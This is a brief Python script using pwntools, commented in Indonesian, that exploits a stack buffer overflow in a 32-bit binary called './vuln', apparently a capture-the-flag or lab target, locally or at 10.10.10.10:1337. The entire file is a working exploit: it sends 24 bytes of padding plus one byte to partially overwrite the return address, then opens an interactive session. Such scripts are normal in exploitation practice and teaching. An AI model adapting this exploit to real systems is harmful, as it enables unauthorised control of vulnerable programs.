from pwn import *

# === CONFIGURATION ===
context.arch = 'i386' # Set ke 32-bit
mode = 'local' 

if mode == 'local':
    p = process('./vuln')
else:
    p = remote('10.10.10.10', 1337)

# --- LANGKAH 1: Susun Payload ---
# Pada 32-bit, offset ke ret addr biasanya lebih kecil
# Kita gunakan nilai dari skenario sebelumnya sebagai contoh
offset_ebp = 24 

# Struktur: [Padding 24 byte] + [1 byte target]
# Kita hanya ingin menimpa byte terakhir dari return address
payload = b'A' * offset_ebp
payload += b'\xa0' 

# --- LANGKAH 2: Kirim Payload ---
log.info(f"Mengirim payload Partial Overwrite 32-bit...")

# Menggunakan p.send() agar tidak mengirim karakter \n (newline)
p.send(payload) 

p.interactive()